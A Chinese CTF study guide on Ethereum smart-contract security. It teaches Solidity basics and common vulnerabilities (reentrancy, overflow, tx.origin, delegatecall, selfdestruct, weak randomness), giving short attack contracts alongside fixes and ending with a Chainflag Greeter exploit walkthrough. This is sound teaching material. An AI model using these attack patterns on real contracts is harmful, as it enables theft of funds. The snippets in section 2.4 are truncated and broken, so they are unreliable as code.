b:T41d5,<h2 id="ctf区块链安全经验总结-solidity基础与智能合约漏洞">CTF区块链安全经验总结——Solidity基础与智能合约漏洞</h2>
<h3 id="一-区块链安全概述">一、区块链安全概述</h3>
<p>区块链安全是 CTF 中近年较火的方向，主要考察以太坊智能合约的漏洞挖掘与利用。题目通常部署一个存在漏洞的合约，要求选手通过构造交易使 <code>isSolved()</code> 返回 <code>true</code> 以获取 flag。</p>
<p><strong>核心能力要求：</strong></p>
<ul>
<li>掌握 Solidity 语言基础与合约结构</li>
<li>理解以太坊运行机制（账户、gas、存储、调用）</li>
<li>熟悉常见智能合约漏洞（重入、整数溢出、访问控制等）</li>
<li>熟练使用 Remix、Foundry、Hardhat、web3.js 等工具</li>
</ul>
<p><strong>常见题型：</strong></p>
<ol>
<li>合约源码审计 + 编写攻击合约</li>
<li>无源码时反编译合约还原逻辑</li>
<li>链上交互（读取存储、调用函数、构造交易）</li>
</ol>

<h3 id="二-solidity-基础">二、Solidity 基础</h3>
<h4 id="2-1-合约文件结构">2.1 合约文件结构</h4>
<p>一个 Solidity 合约文件的结构如下：</p>
<pre><code>合约文件：
    版本声明（pragma）
    import 引入
    合约（contract）：
        状态变量
        函数
        结构类型（struct）
        事件（event）
        函数修改器（modifier）
    代码注释
</code></pre>
<p>完整合约示例：</p>
<pre><code class="hljs language-solidity">pragma solidity ^0.4.0;

import "solidity_for_import.sol";  // 引入另一个合约

contract Test{
    // 状态变量
    uint a;

    // 函数
    function setA(uint x) public {
        a = x;
        emit Set_A(x);  // 调用 setA 时触发事件 Set_A
    }

    // 事件
    event Set_A(uint a);

    // 结构体
    struct Position{
        int lat;
        int lng;
    }

    address public ownerAddr;

    // 函数修改器
    modifier owner(){
        require(msg.sender == ownerAddr);
        _;
    }

    function mine() public owner {
        a += 1;
    }
}
</code></pre>
<h4 id="2-2-语言类型">2.2 语言类型</h4>
<p><strong>常量：</strong> 有理数/整型常量、字符常量、十六进制常量、地址常量。</p>
<p><strong>地址类型（address）：</strong> 表示一个账户地址（20 字节），<code>balance</code> 表示账户余额，<code>transfer</code> 用于转账。</p>
<p><strong>bool 类型：</strong></p>
<pre><code class="hljs language-solidity">pragma solidity ^0.8.7;
contract BooleanTest{
    bool a;
    // view：只读取状态，不修改状态，本地运行不消耗 gas
    function getBool() public view returns(bool){
        return a;
    }
}
</code></pre>
<p><strong>整型运算：</strong></p>
<pre><code class="hljs language-solidity">pragma solidity ^0.8.7;
contract Math{
    uint numa = 4;
    uint numb = 2;
    // pure：不读取且不修改任何状态，本地运行不消耗 gas
    function add(uint a, uint b) public pure returns(uint){
        return a + b;
    }
    function jian(uint a, uint b) public pure returns(uint){
        return a - b;
    }
    function cheng(uint a, uint b) public pure returns(uint){
        return a * b;
    }
    function chu(uint a, uint b) public pure returns(uint){
        return a / b;
    }
}
</code></pre>
<p><strong>位运算：</strong> <code>&#x26;</code>（与）、<code>|</code>（或）、<code>~</code>（取反）、<code>^</code>（异或）、<code>&#x3C;&#x3C;</code>（左移）、<code>>></code>（右移）。</p>
<p><strong>固定长度字节数组（bytes1~bytes32）：</strong></p>
<ul>
<li><code>bytes1 = uint8</code>，<code>bytes2 = uint16</code>，…，<code>bytes32 = uint256</code></li>
<li>可以更好地显示十六进制（<code>bytes1 = 0x6A</code>）</li>
<li>声明为 <code>public</code> 可自动生成调用长度的函数</li>
<li>自带 <code>length</code> 属性，长度固定不可修改</li>
</ul>
<pre><code class="hljs language-solidity">pragma solidity ^0.8.7;
contract Math{
    bytes1 public num1 = 0x12;
    bytes4 public num2 = 0x12121212;
    function getlength1() public view returns(uint8){
        return num1.length;
    }
    function getlength2() public view returns(uint8){
        return num2.length;
    }
}
</code></pre>
<p><strong>数组：</strong></p>
<pre><code class="hljs language-solidity">uint[3] fixed;   // 固定长度 3
uint[] dynamic;  // 动态数组，可增长
Voter[] public voting;  // 结构体数组，public 自动生成 getter
</code></pre>

<h4 id="2-4-以太坊的本质与转账">2.4 以太坊的本质与转账</h4>
<p>以太坊账户分两类：<strong>外部账户（EOA）</strong> 与 <strong>合约账户</strong>。合约通过 <code>payable</code> 函数接收/转账以太币。</p>
<pre><code class="hljs language-solidity">pragma solidity ^0.8.7;

    }

<p>转账示例（<code>this</code> 代表合约地址）：</p>
<pre><code class="hljs language-solidity">pragma solidity ^0.4.0;

        address account = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
        account.transfer(msg.value);  // 把钱转到 account
    }
}
</code></pre>

<h3 id="四-智能合约常见漏洞">四、智能合约常见漏洞</h3>
<h4 id="4-1-重入攻击-reentrancy">4.1 重入攻击（Reentrancy）</h4>
<p>合约在更新状态<strong>之前</strong>调用外部合约并转账，攻击者通过 fallback/receive 函数反复回调，重复提取资金。</p>
<pre><code class="hljs language-solidity">// 有漏洞的合约
function withdraw(uint _amount) public {
    require(balances[msg.sender] >= _amount);
    (bool ok, ) = msg.sender.call{value: _amount}("");  // 先转账
    require(ok);
    balances[msg.sender] -= _amount;  // 后更新余额
}
</code></pre>
<p><strong>攻击合约：</strong></p>
<pre><code class="hljs language-solidity">contract Attack {
    fallback() external payable {
        target.withdraw(1 ether);  // 在接收转账时再次调用
    }
}
</code></pre>
<p><strong>防护：</strong> 遵循 checks-effects-interactions 模式（先校验、再更新状态、最后交互），或使用 OpenZeppelin <code>ReentrancyGuard</code>。</p>
<h4 id="4-2-整数溢出-下溢">4.2 整数溢出/下溢</h4>
<p>Solidity 0.8.0 之前，整数运算不检查溢出；0.8.0 起默认开启溢出检查（抛出异常）。</p>
<pre><code class="hljs language-solidity">// 0.8 之前需 SafeMath 防护；0.8 之后默认安全
uint8 a = 255;
a = a + 1;  // 0.8 之前溢出为 0，0.8 之后回滚
</code></pre>
<p><strong>CTF 考点：</strong> 使余额/计数溢出，绕过 <code>require</code> 检查。</p>
<h4 id="4-3-访问控制缺陷">4.3 访问控制缺陷</h4>
<p><strong>构造函数命名错误（0.4.x）：</strong> Solidity 0.4 中构造函数需与合约同名，若拼写错误则成为可被任意调用的普通函数。</p>
<pre><code class="hljs language-solidity">contract Ownable {
    address public owner;
    function Ownable() public { owner = msg.sender; }  // 正确
    function ownable() public { owner = msg.sender; }  // 拼写错误，任何人可调用夺权
}
</code></pre>
<p><strong>缺失 onlyOwner 修饰器：</strong> 敏感函数（初始化、提款、销毁）未做权限校验。</p>
<h4 id="4-4-tx-origin-身份验证缺陷">4.4 tx.origin 身份验证缺陷</h4>
<p><code>tx.origin</code> 是交易的原始发起者，<code>msg.sender</code> 是当前调用者。用 <code>tx.origin</code> 做身份验证可被钓鱼攻击：诱导受害者（owner）调用恶意合约，恶意合约再调用目标合约时 <code>tx.origin</code> 仍为 owner。</p>
<pre><code class="hljs language-solidity">// 有漏洞
require(tx.origin == owner);
// 应使用
require(msg.sender == owner);
</code></pre>
<h4 id="4-5-delegatecall-任意调用">4.5 delegatecall 任意调用</h4>
<p><code>delegatecall</code> 在<strong>调用者自己的存储上下文</strong>中执行被调用合约的代码，可被利用修改调用者的关键存储变量。</p>
<pre><code class="hljs language-solidity">// 有漏洞
address(delegate).delegatecall(msg.data);  // 存储布局冲突可导致覆盖 owner
</code></pre>
<p><strong>考点：</strong> 利用存储布局对齐，通过 <code>delegatecall</code> 覆盖 slot 0（owner 等关键变量）。</p>
<h4 id="4-6-未初始化存储指针">4.6 未初始化存储指针</h4>
<p>Solidity 中未初始化的 <code>storage</code> 指针默认指向 slot 0，可能导致覆盖关键状态变量。</p>
<pre><code class="hljs language-solidity">contract Test {
    address public owner;  // slot 0
    function f() public {
        address x;  // 未初始化，指向 slot 0，可能覆盖 owner
    }
}
</code></pre>
<h4 id="4-7-自毁与强制转账">4.7 自毁与强制转账</h4>
<p><code>selfdestruct(addr)</code> 会强制把合约余额发送到指定地址，即使目标合约没有 <code>payable</code> 函数。攻击者可利用此绕过"余额只能通过业务逻辑增加"的假设。</p>
<pre><code class="hljs language-solidity">contract Attack {
    constructor() payable {}
    function kill(address payable target) public {
        selfdestruct(target);  // 强制转账
    }
}
</code></pre>
<h4 id="4-8-默认可见性">4.8 默认可见性</h4>
<p>Solidity 0.5 之前函数默认 <code>public</code>，若忘记声明可见性，敏感函数可被任意调用。</p>
<h4 id="4-9-伪随机数">4.9 伪随机数</h4>
<p>链上随机数（<code>blockhash</code>、<code>block.timestamp</code>、<code>block.difficulty</code>）可被矿工或攻击者预测/操纵，不能用于生成安全随机数。</p>
<pre><code class="hljs language-solidity">// 不安全
uint random = uint(keccak256(abi.encodePacked(block.timestamp))) % 100;
</code></pre>

<h3 id="五-实战案例-chainflag">五、实战案例（Chainflag）</h3>
<p>Chainflag 是区块链 CTF 刷题平台，题目合约部署在 Sepolia 测试网，通过 <code>nc</code> 交互。</p>
<h4 id="5-1-部署题目">5.1 部署题目</h4>
<pre><code class="hljs language-bash">nc chall.chainflag.org 10022
We design a pretty easy contract challenge. Enjoy it!
Your goal is to make isSolved() <span class="hljs-keyword">function</span> returns <span class="hljs-literal">true</span>!

[1] - Create an account <span class="hljs-built_in">which</span> will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract <span class="hljs-built_in">source</span> code
</code></pre>
<p>流程：选项 1 创建部署账户 → 用 MetaMask 向该账户转测试币 → 选项 2 部署合约（得到合约地址与交易 hash）→ 选项 4 获取源码 → 编写攻击合约 → 选项 3 提交 token 获取 flag。</p>
<h4 id="5-2-例题-greeter">5.2 例题：Greeter</h4>
<p>题目源码（<code>isSolved</code> 要求 <code>greeting == "HelloChainFlag"</code>）：</p>
<pre><code class="hljs language-solidity">pragma solidity 0.8.7;

contract Greeter {
    string greeting;

    constructor(string memory _greeting) public {
        greeting = _greeting;
    }

    function greet() public view returns (string memory) {
        return greeting;
    }

    function setGreeting(string memory _greeting) public {
        greeting = _greeting;
    }

    function isSolved() public view returns (bool) {
        string memory expected = "HelloChainFlag";
        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));
    }
}
</code></pre>
<p>攻击合约 exp.sol：</p>
<pre><code class="hljs language-solidity">pragma solidity 0.8.7;

contract Greeter {
    string greeting;
    constructor(string memory _greeting) public { greeting = _greeting; }
    function setGreeting(string memory _greeting) public { greeting = _greeting; }
    function isSolved() public view returns (bool) {
        string memory expected = "HelloChainFlag";
        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));
    }
}

contract exp {
    address instance_address = 0x17b96ca2944b1CaA75708d0f2b660D208f2DF1f7;
    Greeter target = Greeter(instance_address);

    constructor() payable {}

    function hack() public returns (bool){
        bool answer = false;
        string memory greeting = "HelloChainFlag";  // memory 存储节省 gas
        target.setGreeting(greeting);               // 调用题目合约修改 greeting
        answer = target.isSolved();                 // 达成条件
        return answer;
    }
}
</code></pre>
<p>在 Remix 中部署 <code>exp.sol</code> 后点击 <code>hack</code> 按钮，支付 gas 后在 <code>nc</code> 中输入 token 获取 flag。</p>
